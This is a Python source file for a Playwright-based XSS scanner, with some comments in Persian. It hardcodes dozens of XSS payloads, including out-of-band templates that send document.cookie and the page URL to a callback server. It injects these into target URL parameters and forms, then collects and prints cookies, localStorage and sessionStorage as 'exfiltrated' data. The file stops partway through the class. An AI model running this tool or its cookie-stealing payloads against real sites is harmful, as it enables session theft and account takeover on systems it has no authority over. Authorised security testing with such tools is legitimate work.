import os
import sys
import asyncio
import uuid
import json
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
from typing import Optional, List
from playwright.async_api import Page, BrowserContext, ConsoleMessage, Dialog
from models import Vulnerability, InjectionTarget
from scanners.base import BaseScanner
from scanners.oob_server import OOBServer
from scanners.request_catcher_monitor import RequestCatcherMonitor



OOB_PAYLOAD_TEMPLATES = [
    {"name": "OOB_SCRIPT_SRC",    "template": "<script src=\"{cb_url}&type=script_src&target=\"+encodeURIComponent(location.href)></script>"},
    {"name": "OOB_SCRIPT_FETCH",  "template": "<script>fetch('{cb_url}&type=fetch&cookie='+encodeURIComponent(document.cookie)+'&target='+encodeURIComponent(location.href))</script>"},
    {"name": "OOB_IMG_ONERROR",   "template": "<img src=x onerror=\"fetch('{cb_url}&type=img_onerror&cookie='+encodeURIComponent(document.cookie)+'&target='+encodeURIComponent(location.href))\">"},
    {"name": "OOB_SVG_ONLOAD",    "template": "<svg onload=\"fetch('{cb_url}&type=svg_onload&cookie='+encodeURIComponent(document.cookie)+'&target='+encodeURIComponent(location.href))\">"},
    {"name": "OOB_IFRAME_SRC",    "template": "<iframe src=\"{cb_url}&type=iframe_src&target=\"+encodeURIComponent(location.href)>"},
    {"name": "OOB_BODY_ONLOAD",   "template": "<body onload=\"fetch('{cb_url}&type=body_onload&target='+encodeURIComponent(location.href))\">"},
    {"name": "OOB_INPUT_ONFOCUS", "template": "<input autofocus onfocus=\"fetch('{cb_url}&type=input_onfocus&target='+encodeURIComponent(location.href))\">"},
    {"name": "OOB_DETAILS",       "template": "<details open ontoggle=\"fetch('{cb_url}&type=details&target='+encodeURIComponent(location.href))\">"},
    {"name": "OOB_XHR",           "template": "<script>var x=new XMLHttpRequest();x.open('GET','{cb_url}&type=xhr&cookie='+encodeURIComponent(document.cookie)+'&target='+encodeURIComponent(location.href));x.send()</script>"},
    {"name": "OOB_META_REFRESH",  "template": "<meta http-equiv=\"refresh\" content=\"0;url={cb_url}&type=meta&target=\"+encodeURIComponent(location.href)>"},
]

# ===== INLINE CLASSIC XSS PAYLOADS - HARDCODED IN SCANNER =====
# فاز ۱: این payload ها داخل خود کد تعریف شدن، بلافاصله اجرا و detect میشن
# همه {TOKEN} دارند برای تشخیص دقیق اجرای JS
INLINE_CLASSIC_PAYLOADS = [
    {"name": "INLINE_01_SVG",        "payload": "\"><svg/onload=alert('{TOKEN}')>"},
    {"name": "INLINE_02_IMG",        "payload": "'\"><img src=x onerror=alert('{TOKEN}')>"},
    {"name": "INLINE_03_CONFIRM",    "payload": "\"><img src=x onerror=confirm('{TOKEN}')>"},
    {"name": "INLINE_04_DETAILS",    "payload": "\"><details open ontoggle=alert('{TOKEN}')>x"},
    {"name": "INLINE_05_BODY",       "payload": "\"><body onload=alert('{TOKEN}')>"},
    {"name": "INLINE_06_IFRAME",     "payload": "\"><iframe srcdoc=\"<script>alert(parent['{TOKEN}']||'{TOKEN}')</script>\">"},
    {"name": "INLINE_07_JSBRK_S",    "payload": "'-alert('{TOKEN}')-'"},
    {"name": "INLINE_08_JSBRK_D",    "payload": "\";alert('{TOKEN}');//"},
    {"name": "INLINE_09_SCRIPT",     "payload": "</script><script>alert('{TOKEN}')</script>"},
    {"name": "INLINE_10_SVG_ANIM",   "payload": "<svg><animate onbegin=alert('{TOKEN}') attributeName=x dur=1s>"},
    {"name": "INLINE_11_MARQUEE",    "payload": "<marquee onstart=alert('{TOKEN}')>"},
    {"name": "INLINE_12_VIDEO",      "payload": "<video><source onerror=alert('{TOKEN}')>"},
    {"name": "INLINE_13_AUDIO",      "payload": "<audio src=x onerror=alert('{TOKEN}')>"},
    {"name": "INLINE_14_SELECT",     "payload": "<select autofocus onfocus=alert('{TOKEN}')>"},
    {"name": "INLINE_15_TEXTAREA",   "payload": "</textarea><script>alert('{TOKEN}')</script>"},
    {"name": "INLINE_16_MATH",       "payload": "<math><mtext><script>alert('{TOKEN}')</script>"},
    {"name": "INLINE_17_TABLE",      "payload": "\"><table background=\"javascript:alert('{TOKEN}')\">"},
    {"name": "INLINE_18_HREF_JS",    "payload": "javascript:alert('{TOKEN}')"},
    {"name": "INLINE_19_ONFOCUS",    "payload": "' autofocus onfocus=alert('{TOKEN}') x='"},
    {"name": "INLINE_20_EVAL",       "payload": "'\"><img src=x onerror=eval(\"alert('{TOKEN}')\")>"},
    {"name": "INLINE_21_PLAIN_1",    "payload": "<script>alert('{TOKEN}')</script>"},
    {"name": "INLINE_22_PLAIN_2",    "payload": "<script>confirm('{TOKEN}')</script>"},
    {"name": "INLINE_23_PLAIN_3",    "payload": "<img src=x onerror=alert('{TOKEN}')>"},
    {"name": "INLINE_24_POLYGLOT",   "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('{TOKEN}') )//"},
    {"name": "INLINE_25_SVG_SHORT",  "payload": "<svg/onload=alert`{TOKEN}`>"},
    # چند payload کلاسیک خالص بدون token هم برای سازگاری قدیمی
    {"name": "INLINE_C1", "payload": "<script>alert(1)</script>"},
    {"name": "INLINE_C2", "payload": "\"><svg onload=alert(1)>"},
    {"name": "INLINE_C3", "payload": "'\"><img src=x onerror=alert(1)>"},
]

# ===== PATCH: JS EXECUTION HOOK =====
XSS_INIT_SCRIPT = r"""
(() => {
  if (window.__obscura_installed) return;
  window.__obscura_installed = true;
  window.__xss_fired = [];
  window.__obscura_token = null;
  const ALLOWED = ['alert','confirm','prompt','eval','Function'];
  const mark = (sink, data, confidence) => {
    try {
      if (!ALLOWED.includes(sink)) return;
      const sdata = String(data||'');
      const tok = window.__obscura_token||'';
      if (tok && tok.length>5 && !sdata.includes(tok)) {
        // token mismatch -> likely FP, ignore
        return;
      }
      window.__xss_fired.push({sink, data: sdata.slice(0,400), ts: Date.now(), token: tok, confidence: confidence||'HIGH'});
      if (confidence!=='LOW') console.log('__XSS_TRIGGER__:'+sink+':'+tok);
    } catch(e){}
  };
  try {
    const _alert = window.alert;
    window.alert = function(a){
      const s=String(a||''); const t=window.__obscura_token||'';
      if (!t || s.includes(t)) { mark('alert', a, 'HIGH'); try{return _alert(a)}catch(e){} }
      return undefined;
    };
    window.confirm = function(a){
      const s=String(a||''); const t=window.__obscura_token||'';
      if (!t || s.includes(t)) mark('confirm', a, 'HIGH');
      return true;
    };
    window.prompt = function(a){ mark('prompt', a, 'HIGH'); return null; };
  } catch(e){}
  try {
    const _eval = window.eval;
    window.eval = function(x){
      const sx = String(x);
      const t = window.__obscura_token||'';
      if ((t && sx.includes(t)) || /alert\s*\(|confirm\s*\(|prompt\s*\(|document\.cookie/i.test(sx)) {
        mark('eval', x, 'HIGH');
      }
      return _eval(x);
    };
  } catch(e){}
})();
"""



class XSSScanner(BaseScanner):
    name = "xss"
    description = "XSS Scanner — File Payloads + OOB + RequestCatcher Detection"

    def __init__(
        self,
        payload_file: Optional[str] = None,
        oob_server: Optional[str] = None,
        xss_payload_file: Optional[str] = None,
        oob_port: int = 8877,
        oob_public_host: Optional[str] = None,
        extra_payload_file: Optional[str] = None,
        request_catcher_url: Optional[str] = None,
        target_domain: Optional[str] = None,
    ):
        self.request_catcher_url = request_catcher_url
        self.target_domain = target_domain
        self.monitor: Optional[RequestCatcherMonitor] = None
        # PATCH: hook tracking for CDP shared context
        self._context_hooked = set()

        if oob_server and oob_server.startswith("http"):
            parsed = urlparse(oob_server)
            public_host = parsed.netloc
            port = parsed.port or 80
            scheme = parsed.scheme or "http"
            self.oob_server = OOBServer(
                host="0.0.0.0",
                port=port,
                public_host=f"{scheme}://{public_host}",
            )
            self.use_external_oob = True
        else:
            self.oob_server = OOBServer(
                host="0.0.0.0",
                port=oob_port,
                public_host=oob_public_host,
            )
            self.use_external_oob = False

        # INLINE payloads - hardcoded in scanner (فاز ۱)
        self.inline_payloads: List[dict] = list(INLINE_CLASSIC_PAYLOADS)
        print(f"  [+] Inline classic payloads   : {len(self.inline_payloads)}  <- HARDCODED")

        self.file_payloads: List[dict] = []

        file_to_load = xss_payload_file or extra_payload_file or payload_file or "xss_payloads/payloads.txt"
        if os.path.exists(file_to_load):
            with open(file_to_load, 'r', encoding='utf-8') as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    if line and not line.startswith('#'):
                        processed = line
                        if '{OOB_SERVER}' in processed:
                            if self.request_catcher_url:
                                processed = processed.replace('{OOB_SERVER}', self.request_catcher_url)
                            else:
                                processed = processed.replace('{OOB_SERVER}', self.oob_server.base_url)

                        self.file_payloads.append({
                            "name": f"FILE_{line_num}",
                            "payload": processed,
                        })
            print(f"  [+] Loaded {len(self.file_payloads)} file payloads from: {file_to_load}")
        else:
            print(f"  [!] Payload file not found: {file_to_load}")
            print(f"  [!] Expected path: {os.path.abspath(file_to_load)}")

        print(f"  [+] Inline payloads           : {len(self.inline_payloads)}  <-- PHASE 1")
        print(f"  [+] File payloads             : {len(self.file_payloads)}  <-- PHASE 2 (OOB from file)")
        print(f"  [+] OOB payload templates     : {len(OOB_PAYLOAD_TEMPLATES)}  <-- PHASE 3")
        if self.request_catcher_url:
            print(f"  [+] RequestCatcher URL        : {self.request_catcher_url}")
            if self.target_domain:
                print(f"  [+] Target Domain             : {self.target_domain}")

    def _build_oob_payloads(self, target: InjectionTarget) -> List[dict]:
        result = []
        if self.request_catcher_url:
            cb_base = self.request_catcher_url
        else:
            cb_base = self.oob_server.base_url

        for t in OOB_PAYLOAD_TEMPLATES:
            token = None
            if not self.request_catcher_url:
                token = self.oob_server.register_token(
                    payload_name=t["name"],
                    param_name=target.param_name,
                    target_url=target.url,
                )
                cb_url = self.oob_server.build_payload_url(token)
            else:
                cb_url = cb_base

            payload = t["template"].replace("{cb_url}", cb_url)
            result.append({
                "name": t["name"],
                "payload": payload,
                "token": token,
            })
        return result

    # ===== PATCH: JS HOOK INSTALL =====
    async def _ensure_hooks(self, context: BrowserContext):
        cid = id(context)
        if cid in self._context_hooked:
            return
        try:
            await context.add_init_script(XSS_INIT_SCRIPT)
            self._context_hooked.add(cid)
        except Exception:
            # CDP shared context may fail – we fallback to page-level
            pass

    async def _install_page_listeners(self, page: Page, exec_token: str, detection_result: dict, console_buffer: List[str]):
        # CDP fallback: inject per-page
        try:
            await page.add_init_script(XSS_INIT_SCRIPT)
        except Exception:
            pass
        try:
            await page.add_init_script(f"window.__obscura_token = '{exec_token}';")
        except Exception:
            pass
        try:
            await page.evaluate(f"window.__obscura_token = '{exec_token}'; window.__xss_fired = [];")
        except Exception:
            pass

        async def _handle_dialog(dialog: Dialog):
            try:
                msg = dialog.message or ""
                detection_result["triggered"] = True
                detection_result["method"] = f"dialog_{dialog.type}"
                detection_result["detail"] = msg
                if exec_token in msg:
                    detection_result["method"] += "_token_match"
            finally:
                try:
                    await dialog.dismiss()
                except Exception:
                    pass
        page.on("dialog", lambda d: asyncio.create_task(_handle_dialog(d)))

        def _on_console(msg: ConsoleMessage):
            txt = msg.text
            console_buffer.append(txt)
            if "__XSS_TRIGGER__" in txt and exec_token and exec_token in txt:
                detection_result["triggered"] = True
                detection_result["method"] = "console_hook"
                detection_result["detail"] = txt
        page.on("console", _on_console)
        page.on("pageerror", lambda e: console_buffer.append(f"PAGEERROR:{e}"))

    async def scan(self, targets: List[InjectionTarget], context: BrowserContext) -> List[Vulnerability]:
        vulnerabilities: List[Vulnerability] = []

        if not targets:
            print("  [!] No targets to test.")
            return vulnerabilities

        # PATCH: install JS hooks
        await self._ensure_hooks(context)

        if not self.request_catcher_url:
            self.oob_server.start()

        if self.request_catcher_url:
            self.monitor = RequestCatcherMonitor(
                self.request_catcher_url, 
                context,
                target_domain=self.target_domain
            )
            await self.monitor.start()
            print(f"  [+] RequestCatcher monitor started: {self.request_catcher_url}")

        all_payloads_template = self.file_payloads

        total_inline = len(self.inline_payloads)
        total_file = len(self.file_payloads)
        total_oob = len(OOB_PAYLOAD_TEMPLATES)
        print(f"\n  [*] XSS Scan — {len(targets)} targets")
        print(f"      Phase1 INLINE   : {total_inline}")
        print(f"      Phase2 FILE/OOB : {total_file}")
        print(f"      Phase3 OOB tmpl : {total_oob}")
        print(f"      Total per target: {total_inline + total_file + total_oob}")
        if self.request_catcher_url:
            print(f"      OOB target      : RequestCatcher ({self.request_catcher_url})")
            print(f"      Checkpoint every: 10 payloads")
        else:
            print(f"      OOB base URL    : {self.oob_server.base_url}")

        print("\n  Choose mode: [auto/manual] ", end="")
        try:
            mode = input().strip().lower()
        except EOFError:
            mode = "auto"

        try:
            if mode == 'auto':
                print("\n  [*] AUTO mode\n")
                for idx, target in enumerate(targets, 1):
                    path = urlparse(target.url).path
                    print(f"\n  ╔══ [{idx}/{len(targets)}] {target.param_name} ({target.method})")
                    print(f"  ╠══ Path  : {path}")
                    print(f"  ╚══ Target: {target.url[:70]}")
                    found = await self._test_target(context, target, all_payloads_template)
                    vulnerabilities.extend(found)
            else:
                print("\n  [*] MANUAL mode\n")
                found = await self._manual_scan(targets, context, all_payloads_template)
                vulnerabilities.extend(found)

        except KeyboardInterrupt:
            print("\n  [!] Scan interrupted.")
        except Exception as e:
            print(f"  [!] Scan error: {e}")
            import traceback
            traceback.print_exc()
        finally:
            print(f"\n  [+] Injection phase complete. Waiting 5s for late callbacks...")
            await asyncio.sleep(5)

            if self.monitor:
                print(f"\n  [*] Final RequestCatcher sweep...")
                new_reqs = await self.monitor.check_new_requests()
                for req in new_reqs:
                    req_target = req.get('target', '')
                    if req_target:
                        for target in targets:
                            target_base = target.url.split('?')[0].rstrip('/')
                            req_base = req_target.split('?')[0].rstrip('/')
                            if target_base == req_base or req_base.startswith(target_base) or target_base.startswith(req_base):
                                already = any(
                                    v.parameter == target.param_name and v.source == target.url and 'requestcatcher' in (v.proof or '')
                                    for v in vulnerabilities
                                )
                                if not already:
                                    exfiltrated = {}
                                    if req.get('cookie'):
                                        exfiltrated['cookie'] = req['cookie']
                                    if req.get('target'):
                                        exfiltrated['target_url'] = req['target']
                                    if req.get('ip'):
                                        exfiltrated['source_ip'] = req['ip']
                                    if req.get('user_agent'):
                                        exfiltrated['user_agent'] = req['user_agent']

                                    vuln = Vulnerability(
                                        category="XSS",
                                        severity="CRITICAL" if exfiltrated.get('cookie') else "HIGH",
                                        match="RequestCatcher Final Sweep",
                                        source=target.url,
                                        endpoint=target.url,
                                        payload=f"OOB payload triggered from {req_target}",
                                        parameter=target.param_name,
                                        proof=f"method=requestcatcher_final | target={req_target} | cookie={'YES' if exfiltrated.get('cookie') else 'NO'}",
                                        cwe_id="CWE-79",
                                    )
                                    vuln.exfiltrated_data = exfiltrated
                                    vulnerabilities.append(vuln)
                                    print(f"\n  🎯 XSS CONFIRMED via RequestCatcher (final sweep)!")
                                    print(f"     Parameter : {target.param_name}")
                                    print(f"     Target URL: {req_target}")
                                    if exfiltrated.get('cookie'):
                                        print(f"     🍪 COOKIE EXFILTRATED: {exfiltrated['cookie'][:100]}")
                                    break

            if not self.request_catcher_url:
                oob_callbacks = self.oob_server.get_all_callbacks()
                for cb in oob_callbacks:
                    already = any(
                        v.payload == cb.payload_name and v.parameter == cb.param_name
                        for v in vulnerabilities
                    )
                    if not already:
                        vuln = Vulnerability(
                            category="XSS",
                            severity="HIGH",
                            match=cb.payload_name,
                            source=cb.target_url,
                            endpoint=cb.target_url,
                            payload=cb.payload_name,
                            parameter=cb.param_name,
                            proof=f"method=oob_callback | token={cb.token} | extra={cb.extra}",
                            cwe_id="CWE-79",
                        )
                        vulnerabilities.append(vuln)

                print(self.oob_server.summary())

            if vulnerabilities:
                print(f"\n  🎯 TOTAL CONFIRMED VULNERABILITIES: {len(vulnerabilities)}")
                for v in vulnerabilities:
                    path = urlparse(v.endpoint).path
                    print(f"\n     [{v.severity}] {v.parameter} @ {path}")
                    print(f"            Full URL : {v.endpoint[:80]}")
                    print(f"            Payload  : {v.payload[:80]}")
                    print(f"            Proof    : {v.proof[:120]}")
                    if getattr(v, 'exfiltrated_data', None):
                        print(f"            🍪 Exfiltrated Data:")
                        for key, value in v.exfiltrated_data.items():
                            print(f"               ├─ {key}: {str(value)[:80]}")

            if not self.request_catcher_url:
                self.oob_server.stop()
            if self.monitor:
                await self.monitor.stop()

        return vulnerabilities

    def _display_targets(self, targets):
        print("\n" + "=" * 90)
        print("  INJECTION TARGETS")
        print("=" * 90)
        for idx, t in enumerate(targets, 1):
            tt = "URL " if t.target_type == "url_param" else "FORM"
            path = urlparse(t.url).path
            print(f"  [{idx:3d}] [{tt}] [{t.method.upper():4s}] [depth={t.crawl_depth}]")
            print(f"        Path : {path}")
            print(f"        Param: {t.param_name:20s} → {t.url[:60]}")
        print("="  *90 + f"\n  Total: {len(targets)}\n" + "="*  90)

    async def _manual_scan(self, targets, context, all_payloads_template) -> List[Vulnerability]:
        vulns = []
        while True:
            self._display_targets(targets)
            print("\n  OPTIONS: [1-N] inject | list | auto | exit")
            print("  Your choice: ", end="")
            choice = input().strip().lower()

            if choice in ['exit', 'quit', 'q']:
                break
            elif choice == 'list':
                continue
            elif choice in ['auto', 'a']:
                print("\n  [*] Switching to AUTO mode...\n")
                for idx, t in enumerate(targets, 1):
                    print(f"\n  [{idx}/{len(targets)}] {t.param_name} ({t.method})")
                    vulns.extend(await self._test_target(context, t, all_payloads_template))
                break
            elif choice.isdigit():
                idx = int(choice) - 1
                if 0 <= idx < len(targets):
                    t = targets[idx]
                    print(f"\n  [{idx+1}/{len(targets)}] {t.param_name} ({t.method})")
                    vulns.extend(await self._test_target(context, t, all_payloads_template))
                    print("\n  What's next? [next/auto/exit]: ", end="")
                    nxt = input().strip().lower()
                    if nxt in ['exit', 'q']:
                        break
                    elif nxt in ['auto', 'a']:
                        for j in range(idx + 1, len(targets)):
                            tt = targets[j]
                            print(f"\n  [{j+1}/{len(targets)}] {tt.param_name} ({tt.method})")
                            vulns.extend(await self._test_target(context, tt, all_payloads_template))
                        break
        return vulns

    async def _check_request_catcher_and_ask(self, target: InjectionTarget, p_idx: int, total: int):
        if not self.monitor:
            return None

        print(f"\n  ══════════════════════════════════════════════════════")
        print(f"  🔍 CHECKPOINT: Checking RequestCatcher after {p_idx}/{total} payloads...")
        print(f"  ══════════════════════════════════════════════════════")

        await asyncio.sleep(3)
        new_reqs = await self.monitor.check_new_requests()

        if new_reqs:
            print(f"\n  ⚠️  {len(new_reqs)} NEW REQUEST(S) FOUND IN REQUESTCATCHER!")
            for i, req in enumerate(new_reqs, 1):
                print(f"\n  ┌─ Request #{i}")
                print(f"  │  Method : {req.get('method', 'N/A')}")
                print(f"  │  Path   : {req.get('path', 'N/A')}")
                if req.get('cookie'):
                    print(f"  │  🍪 Cookie: {req['cookie'][:80]}")
                if req.get('target'):
                    print(f"  │  📍 Target: {req['target'][:80]}")
                if req.get('ip'):
                    print(f"  │  🌐 IP    : {req['ip']}")
                if req.get('user_agent'):
                    print(f"  │  🖥️  UA    : {req['user_agent'][:80]}")
                print(f"  └─ End Request #{i}")

            matched_req = None
            for req in new_reqs:
                req_target = req.get('target', '')
                if req_target:
                    target_base = target.url.split('?')[0].rstrip('/')
                    req_base = req_target.split('?')[0].rstrip('/')
                    if target_base == req_base or req_base.startswith(target_base) or target_base.startswith(req_base):
                        matched_req = req
                        break

            if not matched_req and new_reqs:
                matched_req = new_reqs[0]

            if matched_req:
                exfiltrated = {}
                if matched_req.get('cookie'):
                    exfiltrated['cookie'] = matched_req['cookie']
                if matched_req.get('target'):
                    exfiltrated['target_url'] = matched_req['target']
                if matched_req.get('ip'):
                    exfiltrated['source_ip'] = matched_req['ip']
                if matched_req.get('user_agent'):
                    exfiltrated['user_agent'] = matched_req['user_agent']

                print(f"\n  🎯 XSS CONFIRMED via RequestCatcher checkpoint!")

                vuln = Vulnerability(
                    category="XSS",
                    severity="CRITICAL" if exfiltrated.get('cookie') else "HIGH",
                    match="RequestCatcher Callback",
                    source=target.url,
                    endpoint=target.url,
                    payload=f"Payload triggered at payload #{p_idx}",
                    parameter=target.param_name,
                    proof=f"method=requestcatcher_checkpoint | payload_idx={p_idx} | cookie={'YES' if exfiltrated.get('cookie') else 'NO'}",
                    cwe_id="CWE-79",
                )
                vuln.exfiltrated_data = exfiltrated

                print(f"  [*] Continuing with remaining payloads automatically...")
                return ("FOUND_CONTINUE", vuln)
        else:
            print(f"  [−] No new requests found in RequestCatcher")

        return ("CONTINUE", None)

    async def _test_target(self, context: BrowserContext, target: InjectionTarget, payload_template: list) -> List[Vulnerability]:
        vulns = []
        # PHASE 1: inline classic payloads (hardcoded)
        inline_payloads = getattr(self, 'inline_payloads', [])
        # PHASE 2: file payloads (OOB from file)
        # PHASE 3: OOB templates
        oob_payloads = self._build_oob_payloads(target)
        all_payloads = inline_payloads + payload_template + oob_payloads

        total_inline = len(inline_payloads)
        total_file = len(payload_template)
        total_oob = len(oob_payloads)
        print(f"      [*] Phase breakdown: INLINE={total_inline} | FILE={total_file} | OOB={total_oob} | TOTAL={len(all_payloads)}")

        for p_idx, p_info in enumerate(all_payloads, 1):
            name = p_info["name"]
            payload_raw = p_info["payload"]
            token = p_info.get("token")
            # is_inline / is_file / is_oob detection
            is_inline = name.startswith("INLINE_")
            is_file = name.startswith("FILE_")
            is_oob = name.startswith("OOB_")
            # inline payloads هم مثل file payloads با JS exec detection چک میشن
            is_exec_test = is_inline or is_file
            # برای سازگاری با کد قدیمی که فقط is_file چک میکنه:
            is_file = is_exec_test

            # PATCH: exec token per payload
            exec_token = f"OBSCURA_{uuid.uuid4().hex[:8]}"
            payload = payload_raw.replace("{TOKEN}", exec_token)

            print(f"\n      [{p_idx}/{len(all_payloads)}] {name}")
            print(f"          Path    : {urlparse(target.url).path}")
            print(f"          Param   : {target.param_name}")
            print(f"          ExecTok : {exec_token}")
            print(f"          Payload : {payload[:100]}{'...' if len(payload) > 100 else ''}")
            if token:
                print(f"          Token   : {token}")
            sys.stdout.flush()

            page = None
            try:
                page = await context.new_page()
                page.set_default_timeout(15000)
                page.set_default_navigation_timeout(15000)
                detection_result = {"triggered": False, "method": "", "detail": "", "exfiltrated": None}
                console_buffer: List[str] = []

                # PATCH: install listeners
                await self._install_page_listeners(page, exec_token, detection_result, console_buffer)

                if target.target_type == "url_param" or target.method.upper() == "GET":
                    vuln = await self._test_url_param(page, target, payload, name, token, is_file, is_oob, detection_result, exec_token, console_buffer)
                else:
                    vuln = await self._test_form_param(page, target, payload, name, token, is_file, is_oob, detection_result, exec_token, console_buffer)

                if vuln:
                    vulns.append(vuln)
                    print(f"          🎯 CONFIRMED! method={detection_result['method']}")
                    # === NEW: immediate cookie output ===
                    exf = detection_result.get('exfiltrated') or {}
                    if exf:
                        ck = exf.get('cookie','')
                        if ck:
                            print(f"          🍪 COOKIE  : {ck[:160]}")
                        print(f"          🌐 DOMAIN  : {exf.get('domain','')}")
                        print(f"          📍 URL     : {exf.get('url','')[:100]}")
                        # localStorage preview
                        ls = exf.get('localStorage') or {}
                        if ls:
                            print(f"          💾 LS      : {str(ls)[:120]}")
                    print(f"          ──────────────────────────────")

            except Exception as e:
                print(f"          [!] Error: {str(e)[:100]}")
                import traceback
                traceback.print_exc()
            finally:
                if page:
                    try:
                        await page.close()
                    except:
                        pass

            if self.monitor and p_idx % 10 == 0 and p_idx < len(all_payloads):
                result = await self._check_request_catcher_and_ask(target, p_idx, len(all_payloads))
                if result:
                    status, vuln = result
                    if vuln:
                        vulns.append(vuln)
                    if status in ["SKIP", "FOUND_AND_SKIP"]:
                        break

        return vulns

    # PATCH: reflection now checks token, not full payload
    async def _check_reflection(self, page: Page, token_or_payload: str) -> bool:
        try:
            content = await page.content()
            # if it looks like OBSCURA_ token, search that, else fallback
            needle = token_or_payload
            return needle.lower() in content.lower()
        except:
            return False

    # PATCH: signature extended with exec_token + console_buffer
    async def _test_url_param(self, page, target, payload, name, token, is_file, is_oob, detection_result, exec_token=None, console_buffer=None):
        if exec_token is None:
            exec_token = "OBSCURA"
        if console_buffer is None:
            console_buffer = []
        test_url = self._inject_to_url(target.url, target.param_name, payload)
        print(f"          URL     : {test_url[:110]}")
        sys.stdout.flush()

        nav_ok = await self._safe_navigate(page, test_url)
        if not nav_ok:
            print(f"          [!] Navigation failed, skipping")
            return None

        # re-assert token after nav
        try:
            await page.evaluate(f"window.__obscura_token='{exec_token}'")
        except Exception:
            pass

        if is_file:
            reflected = await self._check_reflection(page, exec_token)
            if reflected:
                print(f"          [✓] Token reflected")
            else:
                print(f"          [~] Token not in HTML – checking DOM exec anyway")
            await self._wait_for_trigger(page, detection_result, exec_token, console_buffer)
            if detection_result["triggered"]:
                # FP guard – require HIGH confidence
                conf = detection_result.get("confidence","") or ""
                meth = detection_result.get("method","")
                if conf not in ("HIGH","MEDIUM") and "token_match" not in meth and "js_hook:alert" not in meth and "js_hook:confirm" not in meth and "console_token_match" not in meth:
                    print(f"          [~] Low confidence ({meth}) – skip, treating as SAFE to reduce FP")
                    detection_result["triggered"] = False
                    print(f"          [−] Reflected but no inline trigger (may still work via OOB)")
                    return None
                # verify token in page context once more
                try:
                    v = await page.evaluate("(tok)=>{const a=window.__xss_fired||[]; return a.some(x=>x.token===tok && ["alert","confirm","prompt","eval"].includes(x.sink))}", exec_token)
                    if not v and exec_token.startswith("OBSCURA_"):
                        print(f"          [✗] FP guard – token not re-verified in page, abort")
                        detection_result["triggered"] = False
                        return None
                except Exception:
                    pass
                # === Cookie exfil ONLY after HIGH confidence verification ===
                try:
                    exfil = await page.evaluate("""() => {
                        return {
                            cookie: document.cookie || '',
                            domain: document.domain || location.hostname,
                            url: location.href,
                            localStorage: (()=>{try{return Object.fromEntries(Object.entries(localStorage).slice(0,5))}catch(e){return {}}})(),
                            sessionStorage: (()=>{try{return Object.fromEntries(Object.entries(sessionStorage).slice(0,5))}catch(e){return {}}})(),
                            userAgent: navigator.userAgent
                        }
                    }""")
                    # اگر کوکی گرفتیم، بذار توی detection_result
                    ck = (exfil.get('cookie') or '').strip()
                    if ck and len(ck) > 3:
                        detection_result['exfiltrated'] = exfil
                        print(f"          🍪 COOKIE CAPTURED: {ck[:160]}")
                    else:
                        # حتی اگر کوکی خالی بود، بقیه اطلاعات رو نگه دار
                        detection_result['exfiltrated'] = exfil
                        print(f"          [i] JS executed – cookie empty, domain={exfil.get('domain')}")
                except Exception as e:
                    print(f"          [~] exfil error: {e}")
                return self._make_vuln(target, payload, name, detection_result, test_url, exec_token)
            print(f"          [−] Reflected but no inline trigger (may still work via OOB)")

        if is_oob:
            await page.wait_for_timeout(2000)
            if token:
                cb = self.oob_server.get_callback(token)
                if cb:
                    detection_result["triggered"] = True
                    detection_result["method"] = "oob_instant"
                    detection_result["detail"] = f"token={token} extra={cb.extra}"
                    return self._make_vuln(target, payload, name, detection_result, test_url, exec_token)
            print(f"          [→] OOB injected, waiting for callback...")

        return None

    async def _test_form_param(self, page, target, payload, name, token, is_file, is_oob, detection_result, exec_token=None, console_buffer=None):
        if exec_token is None:
            exec_token = "OBSCURA"
        if console_buffer is None:
            console_buffer = []
        form_page = getattr(target, 'form_page_url', '') or target.url
        if form_page == target.url and target.url.endswith(('post.php', 'submit', 'process', 'handler')):
            print(f"          [!] WARNING: form_page_url seems to be an endpoint, not a form page.")
        print(f"          Form    : {target.url}")
        print(f"          Page    : {form_page[:80]}")
        print(f"          Path    : {urlparse(target.url).path}")
        sys.stdout.flush()

        nav_ok = await self._safe_navigate(page, form_page)
        if not nav_ok:
            print(f"          [!] Navigation failed, skipping")
            return None

        await page.wait_for_timeout(800)
        try:
            await page.evaluate(f"window.__obscura_token='{exec_token}'; window.__xss_fired=[]")
        except Exception:
            pass

        try:
            await page.wait_for_selector(
                f"[name='{target.param_name}'], [id='{target.param_name}']",
                timeout=8000
            )
            print(f"          [✓] Form field found")
        except Exception:
            print(f"          [⚠] Form field not found after 8s — trying anyway")

        result_str = await self._fill_and_submit_smart(page, target.param_name, payload, form_page)
        print(f"          Submit  : {result_str}")

        if "not_found" in result_str:
            print(f"          [!] Target input not found in form")
            return None

        # re-assert token post-submit
        try:
            await page.evaluate(f"window.__obscura_token='{exec_token}'")
        except Exception:
            pass

        if is_file:
            reflected = await self._check_reflection(page, exec_token)
            if reflected:
                print(f"          [✓] Token reflected in page")
            await self._wait_for_trigger(page, detection_result, exec_token, console_buffer, max_wait_ms=3500)
            if detection_result["triggered"]:
                # === NEW: cookie exfiltration on successful XSS (form) ===
                try:
                    exfil = await page.evaluate("""() => {
                        return {
                            cookie: document.cookie || '',
                            domain: document.domain || location.hostname,
                            url: location.href,
                            localStorage: (()=>{try{return Object.fromEntries(Object.entries(localStorage).slice(0,5))}catch(e){return {}}})(),
                            sessionStorage: (()=>{try{return Object.fromEntries(Object.entries(sessionStorage).slice(0,5))}catch(e){return {}}})(),
                            userAgent: navigator.userAgent,
                            referrer: document.referrer || ''
                        }
                    }""")
                    detection_result['exfiltrated'] = exfil
                    ck = (exfil.get('cookie') or '').strip()
                    if ck and len(ck) > 3:
                        print(f"          🍪 COOKIE CAPTURED: {ck[:160]}")
                    else:
                        print(f"          [i] JS executed – cookie empty, domain={exfil.get('domain')}")
                except Exception as e:
                    print(f"          [~] exfil error: {e}")
                return self._make_vuln(target, payload, name, detection_result, target.url, exec_token)

            if not reflected:
                try:
                    content_len = len(await page.content())
                except:
                    content_len = 0
                print(f"          [−] Payload not reflected after submit (content len={content_len})")

        if is_oob:
            await page.wait_for_timeout(2000)
            if token:
                cb = self.oob_server.get_callback(token)
                if cb:
                    detection_result["triggered"] = True
                    detection_result["method"] = "oob_instant"
                    detection_result["detail"] = f"token={token} extra={cb.extra}"
                    return self._make_vuln(target, payload, name, detection_result, target.url, exec_token)
            print(f"          [→] OOB injected, waiting for callback...")

        return None

    # PATCH: real JS execution wait
